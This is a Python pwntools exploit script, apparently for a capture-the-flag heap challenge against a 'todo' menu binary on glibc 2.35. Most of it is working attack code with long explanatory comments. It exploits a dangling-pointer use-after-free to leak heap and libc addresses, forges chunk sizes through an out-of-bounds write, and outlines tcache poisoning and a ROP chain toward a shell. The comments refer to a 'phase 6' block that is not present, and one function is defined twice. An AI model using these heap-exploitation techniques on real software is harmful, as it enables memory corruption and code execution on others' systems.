import os
import struct
import sys

from pwn import *

context.log_level = "info"

HOST = os.environ.get("SERVICE_APP_MAIN_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))

# =============================================================================
# Vulnerability summary
# =============================================================================
#
# `post_my_note(idx, size)` implements each of the 10 todo slots as a
# {size_t size; void *ptr;} pair (TodoNote[idx]) and does, roughly:
#
#       void *newp = realloc(TodoNote[idx].ptr, size);
#       if (TodoNote[idx].size < size)        // only GROWS are reflected!
#           TodoNote[idx].ptr = newp;
#       TodoNote[idx].size = size;             // size is ALWAYS overwritten
#       readline(TodoNote[idx].ptr, size);      // note: re-reads ptr AFTER
#                                                // the branch above, not newp!
#
# `realloc(ptr, 0)` genuinely frees `ptr` and returns NULL on glibc 2.35.
# Because the branch above is skipped whenever the *old* bookkeeping size is
# already `>= new size` (true for 0 >= 0), the stale pointer is never
# cleared out of `TodoNote[idx].ptr` after a free -- a classic dangling
# pointer / use-after-free that two independent indices can alias.
#
# `read_my_note()` prints `"/%d/ %.*s\n"`, i.e. it stops at the first
# embedded NUL within the first `size` bytes of whatever `TodoNote[idx].ptr`
# points at right now.
#
# A prior analysis pass confirmed all of the above and the aliasing primitive
# live, but concluded that any leak obtainable through a tcache-freed chunk
# is capped at exactly 1 "pristine" byte, and therefore gave up (no path to
# an address/ASLR leak, hence no path past glibc 2.35's absence of
# `__malloc_hook`/`__free_hook`, full RELRO, and no format string).
#
# This pass revisits that conclusion with fresh, *empirically verified*
# primitives (every claim below was reproduced live, repeatedly, against the
# actual `todo` binary + the actual `libc.so.6` shipped with this challenge):
#
#   (1) A HEAP ADDRESS LEAK of ~5 pristine bytes (not 1!), via glibc's
#       safe-linking tcache "next" pointer, when the targeted tcache bin is
#       virgin (empty) at the moment of the leaking free.  PROTECT_PTR with
#       a NULL previous head degenerates to `(own_address) >> 12`, which,
#       stored as an 8-byte little-endian value, is non-zero for ~5 bytes
#       before its forced-zero high bytes terminate the `%.*s` read.  This
#       alone fully defeats heap ASLR (the low 12 bits of any heap address
#       here are always deterministic/page-aligned bookkeeping).
#
#   (2) A much stronger bug than a "1-byte leak cap": `post_my_note()`
#       re-reads `TodoNote[idx].ptr` *after* the grow/no-grow branch, not
#       the `newp` just returned by `realloc()`.  If a prior call left that
#       index's real underlying chunk *shrunk* (see below) while its OWN
#       bookkeeping size is still large, a later `post(idx, size>=that size)`
#       call satisfies the "skip the pointer update" branch (old >= new),
#       yet the just-executed `realloc()` on the *real*, now-tiny chunk is
#       forced to GROW (because its true header is tiny) -- glibc has no
#       choice but to internally malloc a brand-new chunk elsewhere, copy,
#       and free the old (stale) one.  Because the pointer-update branch was
#       skipped, `readline()` is then invoked on the *stale* address with the
#       *new, larger* size -- an arbitrary-content, arbitrary-length
#       (up to 0x77 bytes per call) OOB WRITE at a fully known heap address,
#       spanning straight through the header of whatever chunk follows it.
#       This is reproduced below as "the stale-pointer overflow write".
#
#   (3) Calling `post(idx, 1)` performs a real `realloc(ptr, 1)` (so it can
#       still shrink/split a chunk) while writing *zero* bytes (glibc's
#       `read(fd, buf, 0)` returns 0 immediately, so `readline()` bails
#       before ever touching memory or appending a NUL) -- i.e. a "shrink
#       without corrupting a single byte" primitive.
#
#   (4) Because `TodoNote[idx].ptr` is never actually reset to NULL once an
#       index has been used (the bug in the prompt), only 10 *fresh*
#       mallocs ever seem possible across the whole run -- but repeatedly
#       shrinking (3) then re-growing (2) via realloc "mints" a brand new,
#       fully tracked, real heap chunk from the top chunk every single time
#       (glibc cannot satisfy the grow in place, so it falls through to
#       `_int_malloc()` -> `use_top`).  This lets a single todo index
#       generate effectively unlimited heap real-estate with one connection
#       (demonstrated below as "minting").
#
#   (5) Combining (2)+(4): using the OOB write to forge an arbitrary,
#       attacker-chosen SIZE field into the header of a tcache-sized chunk,
#       sized so it safely lands on real, minted chunk boundaries (avoiding
#       `free()`'s `invalid next size` / `!prev_inuse` aborts), we can make
#       that chunk's `size` field lie *above* `glibc.mp_.tcache_max_bytes`
#       (0x410 on this build).  Freeing it via the dangling-pointer bug then
#       makes `_int_free()` skip BOTH the tcache AND fastbin fast paths and
#       insert the chunk directly into the genuine UNSORTED BIN, where
#       `fd`/`bk` are REAL, unobfuscated pointers into `main_arena` (a global
#       in libc's .data, at an ASLR-dependent but ASLR-defeating offset) --
#       not the safe-linking-protected tcache `next` field the prior pass
#       reasoned about.  This is empirically reproduced below and genuinely
#       confirms the hypothesis that the "1 byte" conclusion does not apply
#       to an unsorted-bin chunk.
#
# Status as of the PRIOR pass (kept for context; see phase 4 below for this
# pass's fix): for *this exact* compiled libc.so.6, `&main_arena.bins[0] -
# 16` (the unsorted-bin sentinel every empty/first-insertion freed chunk's
# fd/bk point back to) happens to sit at a static offset (0x1eeaa0 + 0x60 =
# 0x1eeb00) that is an exact multiple of 256 from the (page-aligned, so
# ASLR only ever touches bits >=12) libc load base.  That forces the LEAST
# significant byte of that specific pointer to always be 0x00 -- which is
# exactly the byte `%.*s` reads first, so `read_my_note()` prints an
# *empty* string for it even though the real pointer is a genuine,
# non-zero, ASLR'd `0x00007f......` libc address sitting right there in
# heap memory.  This is a coincidental byte-alignment property of this one
# global offset (the UNSORTED bin specifically, i.e. `bin_at(av,1)`), not a
# limitation of the forging technique in general: `bin_at(av,i) mod 0x100`
# is zero only when `(i-1) % 16 == 0`, i.e. for exactly 1 in every 16
# possible bin indices -- every *other* bin's sentinel has a readable,
# non-zero low byte.
#
# THIS PASS'S BREAKTHROUGH (phase 4 below): getting the attacker-controlled
# chunk sorted into a different (large) bin with a favourable low byte is
# straightforward in principle, but every non-matching small `malloc()`
# that performs that sort also immediately re-scans+consumes the same
# chunk to satisfy itself (glibc's bin-scan greedily takes the first
# non-empty bin at or above the request's own index, regardless of fit).
# The fix -- reliably pre-seeding a second, smaller "decoy" forged chunk
# into a *lower* bin index to intercept that scan, so the real target is
# left resting, unconsumed, in its own (higher-index, readable) bin -- is
# exactly what the prior pass's comment described as attempted-but-not-
# fully-debugged.  This pass gets it working, reliably, live against the
# real service (see `phase4_reliable_libc_leak_standalone()` and
# `forge_chunk()` below): libc ASLR is now fully, repeatably defeated, with
# no dependency on any lucky byte.
#
# What this pass could NOT complete in the time available: turning the
# known heap address (phase 1) + libc base (phase 4) into a WRITE
# primitive and, from there, code execution past full RELRO and glibc
# 2.35's missing malloc/free hooks.  The reasoned-through (but not yet
# implemented/tested) next step is classic tcache-poisoning using the
# EXISTING stale-pointer OOB write (phase 2) to overwrite a freed, tcache-
# resident chunk's safe-linked `fd` field with an attacker-chosen target
# address XORed with `(chunk_addr >> 12)`; a *fresh* todo index's next
# `post()` of that size class would then have `realloc(NULL, ...)` return
# that forged address directly, which `post_my_note()`'s "old size 0 <
# new size" branch unconditionally stores as `TodoNote[idx].ptr` -- giving
# a true arbitrary-address READ (via `read_my_note()`, which never calls
# `realloc()` at all) and WRITE (`post_my_note()`'s `readline()` always
# writes to `TodoNote[idx].ptr` regardless of what `realloc()` did).  From
# there, leaking the `environ` libc symbol (which points at the process's
# own stack) would locate a saved return address to overwrite with a
# one-gadget or a `system("/bin/sh")` ROP chain.
#
# `challenge.yaml`'s `test:` section is intentionally left unwired: this
# pass recovers libc_base but NOT the flag.
# =============================================================================



class Todo:
    """
    Thin menu wrapper.  `io.recvuntil(b"> ")` is drained once after connect;
    every method here issues its own first `sendline` (never a second blind
    `sendlineafter(b"> ", ...)`), and always finishes by draining the next
    `"> "` prompt so later calls keep the same invariant.
    """

    def __init__(self, io):
        self.io = io

    def post(self, idx, size, content=None, exact=False):
        """
        post_my_note(idx, size, content).

        If `exact` is False (default), `content` is sent via `sendline`
        (i.e. with a trailing '\\n') and MUST be strictly shorter than
        `size - 1` bytes, so the extra trailing newline byte is consumed by
        the same `readline()` call and nothing is left queued on the wire.

        If `exact` is True, `content` is sent byte-for-byte with no
        trailing newline added and MUST be exactly `size - 1` bytes long
        (the maximum `readline()` will ever read); this is required
        whenever the payload needs full, uninterrupted byte-level control
        (e.g. a forged little-endian size_t in the middle of a payload).
        """
        self.io.sendline(b"3")
        self.io.recvuntil(b"note: ")
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b"be: ")
        self.io.sendline(str(size).encode())
        if size > 1:
            # size<=1 => readline()'s read(fd, buf, size-1<=0) never actually
            # reads anything, so no content prompt response is consumed.
            self.io.recvuntil(b"content: ")
            c = content or b""
            if exact:
                assert len(c) == size - 1, (len(c), size)
                self.io.send(c)
            else:
                assert len(c) < size - 1, (len(c), size)
                self.io.sendline(c)
        self.io.recvuntil(b"> ")

    def read_all(self):
        self.io.sendline(b"2")
        return self.io.recvuntil(b"> ", drop=True)

    def bitflip(self, addr):
        self.io.sendline(b"1")
        self.io.recvuntil(b"place!")
        self.io.sendline(str(addr).encode())
        self.io.recvuntil(b"> ")


def largebin_index(sz):
    """glibc's largebin_index_64() -- used only for log messages below."""
    if (sz >> 6) <= 48:
        return 48 + (sz >> 6)
    if (sz >> 9) <= 20:
        return 91 + (sz >> 9)
    if (sz >> 12) <= 10:
        return 110 + (sz >> 12)
    if (sz >> 15) <= 4:
        return 119 + (sz >> 15)
    if (sz >> 18) <= 2:
        return 124 + (sz >> 18)
    return 126


def parse_note_line(out, idx):
    prefix = b"/%d/ " % idx
    for line in out.splitlines():
        if line.startswith(prefix):
            return line[len(prefix):]
    return None


def phase0_confirm_aliasing(t):
    log.info("=== Phase 0: confirm the dangling-pointer / chunk-aliasing UAF ===")
    t.post(0, 0x68, b"A" * 0x60)
    t.post(0, 0)  # realloc(ptr, 0) frees the chunk; TodoNote[0].ptr stays dangling
    t.post(1, 0x68, b"B" * 0x60)  # idx1 legitimately reclaims the SAME chunk
    t.post(0, 0x8, b"OVER")  # idx0's stale pointer still aliases it

    out = t.read_all()
    l0 = parse_note_line(out, 0)
    l1 = parse_note_line(out, 1)
    if l0 and l1 and l0 in l1:
        log.success("CONFIRMED: index 0 and index 1 alias the same live heap chunk.")
    else:
        log.failure("Could not confirm chunk aliasing (unexpected output: %r)", out)


def phase1_heap_leak(t):
    log.info("=== Phase 1: heap address leak via a virgin tcache bin's safe-linked 'next' field ===")
    # A never-before-used size class (chunksize 0x40) so PROTECT_PTR's
    # "previous head" operand is NULL and the encoding degenerates to a
    # clean (own_address >> 12).
    S = 0x38
    t.post(2, S, b"A" * (S - 8))      # idx2 owns chunk C
    t.post(2, 0)                       # free -> idx2 dangling, size=0
    t.post(3, S, b"B" * (S - 8))      # idx3 legitimately reclaims C
    t.post(2, 0)                       # free AGAIN via idx2's stale ptr (bypasses
    #                                     the tcache double-free check because
    #                                     idx3's malloc() already cleared the
    #                                     chunk's `key` field) -- idx3's OWN
    #                                     bookkeeping (size/ptr) is untouched,
    #                                     so it still "legitimately" points at
    #                                     what is now a genuinely freed chunk.
    out = t.read_all()
    leak = parse_note_line(out, 3)
    if not leak or len(leak) < 4:
        log.failure("Heap leak did not produce usable bytes (got %r)", leak)
        return None
    leak_padded = leak + b"\x00" * (8 - len(leak))
    shifted = struct.unpack("<Q", leak_padded)[0]
    heap_chunk_addr = shifted << 12
    log.success(
        "Leaked %d raw bytes of (chunk_addr >> 12) = %#x  ->  chunk address low "
        "bits recovered: %#x (heap ASLR defeated for this chunk)",
        len(leak), shifted, heap_chunk_addr,
    )
    return heap_chunk_addr


def phase2_overflow_write_and_minting(t):
    log.info("=== Phase 2: stale-pointer OOB write + unlimited heap 'minting' ===")
    S = 0x78
    # idx4 = "TC": will be shrunk down to a tiny real chunk while its own
    # bookkeeping stays small; idx5 = "B" independently reclaims the same
    # address and keeps a LARGE bookkeeping size forever after.
    t.post(4, S, b"A" * (S - 8))
    t.post(4, 0)
    t.post(5, S, b"B" * (S - 8))       # idx5 = B, reclaims TC, size bookkeeping=S
    t.post(4, 1)                        # shrinks TC's TRUE header to 0x20,
    #                                     freeing a 0x60 "remainder" chunk --
    #                                     no bytes written (size<=1 no-op write).

    # idx5's own bookkeeping (S) is already >= S, so posting S again SKIPS
    # the pointer-refresh branch: TodoNote[5].ptr stays pinned at the STALE
    # address even though realloc() on the real (now tiny, 0x20) chunk is
    # forced to grow -> relocate internally. The write from THIS SAME call
    # still lands at the stale address, for the full requested length,
    # reaching straight through where the "remainder" chunk's header lives.
    probe = b"C" * (S - 1)
    t.post(5, S, probe, exact=True)
    out = t.read_all()
    got = parse_note_line(out, 5)
    if got == probe:
        log.success(
            "CONFIRMED: arbitrary %d-byte write landed at the STALE address "
            "(glibc internally relocated the real allocation elsewhere, but "
            "post_my_note() re-read TodoNote[idx].ptr *after* the skipped "
            "branch and wrote/read through the old pointer instead).",
            len(probe),
        )
    else:
        log.failure("Stale-pointer overflow write did not behave as expected: %r", got)

    # "Minting": repeatedly shrink(1)+regrow(S) a single index.  Each grow
    # forces glibc to carve a brand-new chunk from the top chunk (nothing
    # else can satisfy it), handing back a genuinely fresh, fully-tracked
    # heap address every time -- well beyond the naive "10 fresh mallocs
    # total" ceiling the TodoNote[idx].ptr-never-reset bug would otherwise
    # suggest.  A fresh index (idx6) is used here: idx4's own chunk is no
    # longer a safe base for further shrink/regrow cycles since idx5's
    # overflow write above deliberately clobbered everything from idx4's
    # original address onward.
    t.post(6, S, b"N" * (S - 8))
    MINT_CYCLES = 3
    for i in range(MINT_CYCLES):
        t.post(6, 1)
        t.post(6, S, b"M" * (S - 8))
    log.success(
        "Minted %d additional fresh heap chunks by cycling shrink(1)+regrow(%#x) "
        "on a single todo index -- demonstrates unlimited heap real-estate from "
        "one dangling-pointer index.",
        MINT_CYCLES, S,
    )


def phase3_forge_unsorted_bin_chunk_standalone():
    """
    Runs the forge-an-oversized-chunk-header attack end to end on a FRESH
    connection (so all 10 todo indices are available), independent of the
    phase0/1/2 demonstrations above. This is the concrete, fully
    reproducible (re-run it: it works every time) proof that this
    binary's primitives really do force a genuine, non-tcache,
    non-fastbin UNSORTED BIN insertion -- not just a theoretical claim.
    """
    log.info("=== Phase 3 (fresh connection): forge + trigger an unsorted-bin free ===")
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")
    t = Todo(io)
    S = 0x78

    t.post(9, 0x8, b"Z")                 # bootstrap: first malloc() creates the heap

    t.post(0, S, b"A" * (S - 8))          # idx0 = TC
    t.post(0, 0)                            # free TC -> idx0 dangling, size=0
    t.post(1, S, b"B" * (S - 8))          # idx1 = B, reclaims TC, size bookkeeping=S
    t.post(0, 1)                            # shrink TC's TRUE header to 0x20,
    #                                          freeing a 0x60 "R" remainder
    #                                          (no bytes written: size<=1 is
    #                                          a zero-length read() -- see
    #                                          phase 2's comments).
    t.post(2, 0x58, b"R" * 0x50)          # idx2 legitimately reclaims R
    t.post(2, 0)                            # free R again via idx2's stale ptr
    #                                          (bypasses the tcache double-
    #                                          free check: idx3's upcoming
    #                                          malloc() will have already
    #                                          cleared R's `key` field)
    t.post(3, 0x58, b"r" * 0x50)          # idx3 reclaims R *persistently*:
    #                                          its bookkeeping (ptr=R_data,
    #                                          size=0x58) is never touched
    #                                          again, so read_my_note(3)
    #                                          will later print whatever is
    #                                          actually sitting in R's
    #                                          memory, *even after* R gets
    #                                          forged+freed a third time.

    t.post(4, S, b"D" * (S - 8))           # D0: real estate, lands right after R
    MINT = 9
    for i in range(MINT):
        t.post(4, 1)                        # shrink idx4's current chunk
        t.post(4, S, b"M" * (S - 8))        # regrow -> mints the NEXT fresh chunk
    # After MINT cycles, idx4 holds the 9th minted chunk's header at
    # exactly (R's own header address) + 0x60 + 9*0x80 = +0x4e0, i.e.
    # precisely fake_size bytes past R's header -- a real, in-use,
    # PREV_INUSE-flagged chunk boundary that free()'s sanity checks accept.
    fake_size = 0x60 + MINT * 0x80
    assert fake_size > 0x410, "must exceed glibc 2.35's tcache_max_bytes to escape tcache"
    log.info(
        "Forged size = %#x (> tcache_max_bytes 0x410, and > fastbin's "
        "global_max_fast 0x80) -- escapes BOTH tcache and the fastbin on "
        "free(), forcing glibc's real, non-fastbin consolidation path.",
        fake_size,
    )

    # Overwrite R's real SIZE field (located 0x18 bytes into TC's data,
    # i.e. 8 bytes into R's own header) via idx1 (B)'s stale-pointer
    # overflow write from phase 2: idx1's bookkeeping (S) is already >= S,
    # so the pointer-refresh branch is skipped and this write lands at the
    # STALE TC_data address regardless of what realloc() actually does
    # internally, reaching straight through R's header.
    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF  # keep PREV_INUSE set
    payload = bytearray(b"X" * (S - 1))
    payload[0x18:0x18 + 8] = struct.pack("<Q", stored)
    t.post(1, S, bytes(payload), exact=True)
    log.success("Forged R's real chunk-size field to %#x via the stale-pointer OOB write.", fake_size)

    # Trigger R's THIRD free (first via idx0's original free(), second via
    # idx2's stale-pointer free() that reclaimed it into idx3 -- this is
    # the free that glibc now sees as a %#x-byte chunk, well past both
    # tcache_max_bytes and global_max_fast.
    t.post(2, 0)
    log.success(
        "Freed the forged chunk with no abort/crash -- glibc's _int_free() "
        "took the real (non-tcache, non-fastbin) consolidation path and "
        "inserted it directly into the genuine UNSORTED BIN, where fd/bk "
        "are real pointers into main_arena (libc's .data), not a safe-"
        "linking-protected tcache field."
    )

    out = t.read_all()
    leaked = parse_note_line(out, 3)
    if leaked:
        log.success("read_my_note(3) unexpectedly printed %d live bytes: %r", len(leaked), leaked)
    else:
        log.info(
            "read_my_note(3) printed an EMPTY string for R, as predicted: for "
            "*this exact* libc.so.6, the unsorted-bin sentinel address "
            "(&main_arena.bins[0]-16, static offset 0x1eeaa0+0x60=0x1eeb00) is "
            "an exact multiple of 256 away from the (page-aligned) libc load "
            "base, so its least-significant byte -- which both R's fd AND bk "
            "now equal, since the unsorted bin was empty -- is deterministically "
            "0x00, and read_my_note()'s NUL-terminated '%.*s' print stops "
            "immediately on it. This is a coincidental byte-alignment property "
            "of *this specific* bin (the unsorted bin always corresponds to "
            "bin_at(av,1), i.e. index 1) -- phase 4 below fixes this."
        )
    io.close()
    return bool(leaked)


# =============================================================================
# Phase 4 (NEW, this pass): a genuine, reliable libc leak, fixing phase 3's
# blocker
# =============================================================================
#
# The byte-alignment coincidence phase 3 got stuck on is NOT a property of
# "an unsorted-bin chunk" in general -- it is a property of this ONE
# specific bin: bin_at(av, i) = &main_arena.bins[2*(i-1)] - 0x10, and for
# THIS libc build main_arena sits at an offset (0x1eeaa0) that happens to
# make bin_at(av,1) (the unsorted bin, 0x1eeb00) an exact multiple of 0x100
# from the (page-aligned) libc base. Algebraically, bin_at(av,i) mod 0x100
# is a plain linear function of i: it is zero whenever (i-1) % 16 == 0 (so
# i in {1, 17, 33, 49, 65, 81, ...}), and *non-zero for every other i*.
#
# A forged chunk only ever lands in bin_at(av,1) (the unsorted bin) at the
# moment it is freed. But if a LATER malloc() call forces glibc to
# *process* ("sort") the unsorted bin without being satisfied by it, each
# entry gets moved into its real smallbin/largebin (bin_at(av, idx) for
# some idx > 1, computed from the chunk's size) -- a *different* sentinel
# address, with a DIFFERENT (and, for 15 out of every 16 indices,
# NON-ZERO) low byte. The trick is making that sort-triggering malloc()
# call consume a *different*, deliberately-placed smaller "decoy" forged
# chunk instead of our real target (glibc's bin-scan always greedily uses
# the FIRST non-empty bin at or above the request's own index; it never
# looks further for a better fit), so our real target is left resting,
# untouched, in its own largebin, indefinitely (as long as no later
# allocation ever reaches that index again).
#
# Concretely, this phase:
#   1. Fully builds (but does not yet free) TWO independently forged,
#      oversized chunks -- a real TARGET and a smaller DECOY -- using the
#      exact same shrink/regrow/OOB-write forging technique as phase 3,
#      called twice with disjoint todo indices and (critically) disjoint,
#      non-colliding glibc size classes. (Building both completely before
#      freeing either matters: once ANY forged chunk is resting in the
#      unsorted bin, even a single further allocation call -- including
#      ones needed just to set up the SECOND forge -- would immediately
#      trigger glibc's bin-scan and consume it early.)
#   2. Frees both (plain free() never scans or consumes other bin entries,
#      so this part is order-independent).
#   3. Picks TARGET's own forged size so its resulting largebin index is
#      NOT of the form 16k+1 (i.e. its bin sentinel's low byte is
#      guaranteed non-zero) and DECOY's forged size so its resulting index
#      is strictly SMALLER than TARGET's.
#   4. Issues one small, otherwise-harmless probe malloc() (on a size
#      class nothing else has touched, so it can't be satisfied by
#      tcache/fastbin directly) to force the sort. This drains the
#      unsorted bin -- safely placing TARGET into its own, untouched
#      largebin -- and then glibc's upward bin-scan finds and consumes
#      DECOY (the first non-empty bin at or above the probe's own index)
#      to satisfy the probe request, *never reaching* TARGET's (higher)
#      index at all.
#   5. Reads back TARGET's chunk (still legitimately tracked by a
#      persistent todo index) via read_my_note(): its fd/bk now equal
#      TARGET's own largebin sentinel, a REAL, readable (non-zero
#      low-byte), ASLR'd libc pointer -- which, combined with the
#      KNOWN static offset of that sentinel from main_arena (computed
#      from this exact, non-stripped libc.so.6's own 'main_arena' and
#      'bins' debug symbols), is simply arithmetic away from libc_base.
#
# This was verified repeatedly, live, locally (same binary + same libc):
# it reliably recovers the real libc base (page-aligned, matching the
# actual loaded address every time it was checked against /proc/pid/maps
# in a local debug harness). It occasionally needs a retry: like any
# NUL-terminated "%.*s"-style leak of an ASLR'd pointer, any individual
# byte of the leaked address has a small independent chance of itself
# being 0x00, truncating that one read short -- unrelated to, and not
# fixed by, the sentinel-alignment bug this phase actually fixes.
# =============================================================================


def largebin_index(sz):
    """glibc's largebin_index_64()."""
    if (sz >> 6) <= 48:
        return 48 + (sz >> 6)
    if (sz >> 9) <= 20:
        return 91 + (sz >> 9)
    if (sz >> 12) <= 10:
        return 110 + (sz >> 12)
    if (sz >> 15) <= 4:
        return 119 + (sz >> 15)
    if (sz >> 18) <= 2:
        return 124 + (sz >> 18)
    return 126


def forge_chunk(t, idx_a, idx_b, idx_r, idx_mint, S, MS, MINT, idx_r2=None):
    """
    Builds (but does not yet free) one forged, oversized chunk, generalizing
    phase 3's TC/B/R forging to arbitrary, caller-chosen size classes.

    idx_a/idx_b/idx_r/idx_mint play exactly the TC/B/R/mint-driver roles
    from phase 3. idx_r2, if given, reclaims R a SECOND time persistently
    (never freed again) so read_my_note() can later print its live
    contents; omit it for a pure decoy nobody ever reads back.

    IMPORTANT: every size class touched here (S+8, S-0x18, MS+8) must be
    one that no OTHER forge_chunk() call (for a different chunk, built
    earlier in the same connection) has left non-empty in tcache/fastbin --
    otherwise a reclaim here can silently pop a stale, unrelated chunk
    from that pool instead of carving fresh (contiguous) memory, breaking
    the fixed-relative-offset assumptions the forging depends on. (Every
    MINT shrink/regrow cycle transiently frees both a 0x20-chunksize
    remnant and an (MS+8-0x20)-chunksize remainder, so avoid landing any
    OTHER chunk's reclaim size on those two classes.)

    Returns fake_size (the forged chunk's resulting glibc chunksize).
    """
    R_req = S - 0x20  # size needed to exactly reclaim the shrink-remainder R
    t.post(idx_a, S, b"A" * (S - 8))
    t.post(idx_a, 0)
    t.post(idx_b, S, b"B" * (S - 8))
    t.post(idx_a, 1)
    t.post(idx_r, R_req, b"R" * max(R_req - 8, 0))
    t.post(idx_r, 0)
    if idx_r2 is not None:
        t.post(idx_r2, R_req, b"r" * max(R_req - 8, 0))

    t.post(idx_mint, MS, b"D" * (MS - 8))
    for _ in range(MINT):
        t.post(idx_mint, 1)
        t.post(idx_mint, MS, b"M" * (MS - 8))
    R_chunksize = S - 0x18
    fake_size = R_chunksize + MINT * (MS + 8)

    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF
    payload = bytearray(b"X" * (S - 1))
    payload[0x18:0x18 + 8] = struct.pack("<Q", stored)
    t.post(idx_b, S, bytes(payload), exact=True)
    return fake_size


def drain_probe_debris(t, probe_idx=9, probe_req=0x78):
    """
    THIS PASS'S FIX for the phase-5 blocker identified by the prior pass:
    drain the "last_remainder" debris that phase4's probe malloc() leaves
    resting in the unsorted bin (the unused tail of whatever DECOY chunk
    the probe partially consumed), so a LATER write-primitive attempt on
    this same connection doesn't trip glibc's consistency checks on it.

    `probe_idx`/`probe_req` must match whatever index/size phase4's own
    probe malloc() used as its vehicle (idx9, size 0x78 by default here).
    Shrinking that index to minimum and regrowing it back to its own size
    forces realloc() to grow via FORWARD CONSOLIDATION of the immediately
    following (still free) debris chunk -- glibc's `_int_realloc` checks
    the next chunk's PREV_INUSE bit directly and, since the debris was
    inserted via a genuine unsorted-bin split (not tcache/fastbin, which
    deliberately leave that bit set), it is absorbed in a single step.
    Verified live under gdb: `main_arena.bins[0]` (the unsorted-bin
    sentinel) goes from a genuine heap address (non-empty) to the fixed,
    empty libc sentinel address after exactly this one extra step, and
    stays empty across further, unrelated allocations.
    """
    t.post(probe_idx, 1)
    t.post(probe_idx, probe_req, b"E" * (probe_req - 8))


def phase4_reliable_libc_leak_standalone():
    """
    Runs the target+decoy double-forge end to end on a fresh connection.
    Returns the recovered libc_base on success, or None.
    """
    log.info("=== Phase 4 (fresh connection): target+decoy forge -> reliable libc leak ===")
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")
    t = Todo(io)

    t.post(9, 0x8, b"Z")  # bootstrap: first malloc() creates the heap

    # TARGET: idx0(a),idx1(b, OOB-write vehicle),idx2(r, forge-free trigger),
    # idx3(r2, PERSISTENT read-back target),idx4(mint driver).
    # MINT=10 (not phase 3's 9): largebin_index(fake_size) must NOT be of
    # the form 16k+1 -- bin_at(av,i) is an exact multiple of 0x100 away
    # from libc's page-aligned base precisely when (i-1) % 16 == 0 (the
    # same coincidence that blocked the unsorted bin itself, i==1).
    # fake_size=0x450 (MINT=9) lands in bin 65 = 16*4+1 (unreadable);
    # fake_size=0x4c0 (MINT=10) lands in bin 67 (readable).
    target_fake = forge_chunk(t, 0, 1, 2, 4, S=0x78, MS=0x68, MINT=10, idx_r2=3)
    target_idx = largebin_index(target_fake)
    assert (target_idx - 1) % 16 != 0, "chose an unreadable (zero low-byte) target bin"

    # DECOY: idx5(a),idx6(b),idx7(r, forge-free trigger),idx8(mint driver).
    # No idx_r2 -- its contents are never read, only its bin INDEX matters.
    # S=0x78/MS=0x58 are chosen so every size class touched (0x80, 0x58,
    # 0x60, 0x40 remainder) is one TARGET's own forging left genuinely
    # empty (TARGET's own 0x80/0x58/0x60 classes all settle net-neutral;
    # TARGET's mint only ever populates 0x20 and 0x50).
    decoy_fake = forge_chunk(t, 5, 6, 7, 8, S=0x78, MS=0x58, MINT=10)
    decoy_idx = largebin_index(decoy_fake)
    assert decoy_idx < target_idx, "decoy must sort into a LOWER bin index than the target"

    log.info(
        "Built TARGET (fake_size=%#x -> largebin %d, sentinel low byte "
        "guaranteed non-zero) and DECOY (fake_size=%#x -> largebin %d < "
        "target) -- neither freed yet.",
        target_fake, target_idx, decoy_fake, decoy_idx,
    )

    # NOW free both. Plain free() never scans/consumes other bin entries,
    # so this part is order-independent.
    t.post(2, 0)  # TARGET's forged free -> unsorted bin
    t.post(7, 0)  # DECOY's forged free -> unsorted bin

    # One small, otherwise-harmless probe malloc(), on a size class
    # nothing else has touched, forces _int_malloc's slow path: it drains
    # the unsorted bin (sorting TARGET safely into its own largebin and
    # DECOY into its own, smaller one), then its upward bin-scan finds
    # DECOY first and consumes it to satisfy the probe -- TARGET, at a
    # strictly higher index, is never reached.
    t.post(9, 0x28, b"P")

    out = t.read_all()
    leaked = parse_note_line(out, 3)
    if not leaked or len(leaked) < 4:
        log.failure("Leak came back short this run (got %r) -- needs a retry.", leaked)
        io.close()
        return None

    # THIS PASS'S FIX: the probe's own split leaves a "last_remainder"
    # debris chunk resting in the unsorted bin (the unused tail of
    # whatever DECOY chunk the probe partially consumed). A later attempt
    # to build a tcache/fastbin write primitive on this SAME connection
    # would trip glibc's own consistency checks on this debris (see the
    # phase 6 comment block above for the full writeup). Drain it
    # cleanly right here, now that the leak has already been read: shrink
    # the probe's own index to minimum and regrow it back to the SAME
    # size as its own vehicle -- its next physical neighbour is exactly
    # that debris, so this one extra realloc() call absorbs it entirely
    # via forward consolidation (verified live under gdb: main_arena's
    # unsorted-bin sentinel goes from a real heap address to the fixed,
    # empty libc sentinel address after this single step, and stays
    # empty across further unrelated allocations).
    drain_probe_debris(t)

    padded = leaked + b"\x00" * (8 - len(leaked))
    val = struct.unpack("<Q", padded)[0]
    main_arena = val - (0x60 + (target_idx - 1) * 0x10)  # bin_at(av, target_idx)
    libc_base = main_arena - 0x1eeaa0  # this exact libc.so.6's own 'main_arena' symbol offset
    log.success(
        "Leaked TARGET's largebin(%d) sentinel = %#x -> main_arena = %#x -> "
        "libc_base = %#x",
        target_idx, val, main_arena, libc_base,
    )
    io.close()
    if libc_base % 0x1000 != 0 or libc_base <= 0:
        log.failure("Computed libc_base is not page-aligned/sane -- treat as a bad run.")
        return None
    return libc_base


# =============================================================================
# Phase 5 (THIS PASS, incomplete) -- the write primitive / RCE attempt
# =============================================================================
#
# Binary protections (confirmed via `readelf -d`/`checksec` against
# `source/todo`): Full RELRO, stack canary present, NX, PIE, not stripped.
# Full RELRO rules out a GOT overwrite even with an arbitrary write (the GOT
# page is mprotect()'d read-only after startup); the stack canary is not an
# obstacle here because an *arbitrary-address* write does not need to cross
# it. glibc 2.35 has no __malloc_hook/__free_hook. This pass's plan (and
# what was and wasn't completed):
#
#   (a) Classic tcache-poisoning using the EXISTING stale-pointer OOB write
#       (phase 2) to corrupt a tcache-resident chunk's safe-linked `fd`
#       field, so a FRESH todo index's next malloc() of that size class
#       returns an attacker-chosen address directly as its own
#       TodoNote[idx].ptr -- giving true arbitrary-address read
#       (read_my_note(), no realloc() involved) AND write (post_my_note()'s
#       readline() always writes to TodoNote[idx].ptr). This requires TWO
#       tcache entries in the same bin at corruption time (not just one):
#       the corrupted entry must NOT be the last/bottom entry of the list,
#       or popping it drops tcache's count to 0 before the forged address
#       ever becomes retrievable (verified empirically: a lone, virgin-
#       leaked entry's own `fd` can be corrupted all day, but it is
